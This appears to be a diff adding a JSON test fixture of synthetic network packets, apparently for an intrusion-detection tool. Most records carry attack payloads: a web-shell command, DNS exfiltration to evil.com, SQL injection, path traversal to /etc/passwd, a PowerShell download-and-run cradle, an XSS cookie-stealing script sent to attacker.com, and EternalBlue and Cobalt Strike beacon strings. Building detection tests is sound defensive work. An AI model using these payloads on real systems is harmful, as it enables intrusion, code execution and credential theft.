@@ -1,0 +1,112 @@
+[
+  {
+    "id": "PKT-001",
+    "timestamp": "2026-05-06T09:00:01",
+    "src_ip": "185.220.101.47",
+    "dst_ip": "10.0.1.5",
+    "src_port": 4444,
+    "dst_port": 54321,
+    "protocol": "TCP",
+    "payload": "GET /shell.php?cmd=whoami HTTP/1.1",
+    "length": 58
+  },
+  {
+    "id": "PKT-002",
+    "timestamp": "2026-05-06T09:00:02",
+    "src_ip": "10.0.1.5",
+    "dst_ip": "185.220.101.47",
+    "src_port": 54321,
+    "dst_port": 4444,
+    "protocol": "TCP",
+    "payload": "MZ\u0090\u0000\u0003\u0000\u0000\u0000PE executable magic bytes",
+    "length": 245760
+  },
+  {
+    "id": "PKT-003",
+    "timestamp": "2026-05-06T09:00:03",
+    "src_ip": "10.0.1.10",
+    "dst_ip": "8.8.8.8",
+    "src_port": 52000,
+    "dst_port": 53,
+    "protocol": "UDP",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.evil.com",
+    "length": 280
+  },
+  {
+    "id": "PKT-004",
+    "timestamp": "2026-05-06T09:01:00",
+    "src_ip": "45.142.212.100",
+    "dst_ip": "10.0.0.1",
+    "src_port": 12345,
+    "dst_port": 80,
+    "protocol": "TCP",
+    "payload": "POST /login.php HTTP/1.1\r\nContent: username=admin'+OR+'1'='1'--&password=x",
+    "length": 95
+  },
+  {
+    "id": "PKT-005",
+    "timestamp": "2026-05-06T09:01:30",
+    "src_ip": "45.142.212.100",
+    "dst_ip": "10.0.0.1",
+    "src_port": 12346,
+    "dst_port": 80,
+    "protocol": "TCP",
+    "payload": "GET /index.php?page=../../../../etc/passwd HTTP/1.1",
+    "length": 72
+  },
+  {
+    "id": "PKT-006",
+    "timestamp": "2026-05-06T09:02:00",
+    "src_ip": "10.0.1.20",
+    "dst_ip": "10.0.1.30",
+    "src_port": 49000,
+    "dst_port": 445,
+    "protocol": "TCP",
+    "payload": "\u0000\u0000\u0000\u0085\u00ffSMBSMB negotiation with EternalBlue pattern Windows",
+    "length": 1396
+  },
+  {
+    "id": "PKT-007",
+    "timestamp": "2026-05-06T09:02:30",
+    "src_ip": "192.168.1.10",
+    "dst_ip": "10.0.0.5",
+    "src_port": 54000,
+    "dst_port": 443,
+    "protocol": "TCP",
+    "payload": "normal HTTPS traffic encrypted content no signature match expected",
+    "length": 1200
+  },
+  {
+    "id": "PKT-008",
+    "timestamp": "2026-05-06T09:03:00",
+    "src_ip": "10.0.1.5",
+    "dst_ip": "185.220.101.47",
+    "src_port": 55000,
+    "dst_port": 4444,
+    "protocol": "TCP",
+    "payload": "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/payload.ps1')",
+    "length": 88
+  },
+  {
+    "id": "PKT-009",
+    "timestamp": "2026-05-06T09:03:30",
+    "src_ip": "77.88.55.60",
+    "dst_ip": "10.0.0.10",
+    "src_port": 11000,
+    "dst_port": 80,
+    "protocol": "TCP",
+    "payload": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+    "length": 90
+  },
+  {
+    "id": "PKT-010",
+    "timestamp": "2026-05-06T09:04:00",
+    "src_ip": "10.0.1.5",
+    "dst_ip": "185.220.101.47",
+    "src_port": 56000,
+    "dst_port": 80,
+    "protocol": "TCP",
+    "payload": "Mozilla/5.0 (compatible; Cobalt Strike Beacon; Windows NT 6.1) custom C2 beacon keepalive",
+    "length": 120
+  }
+]
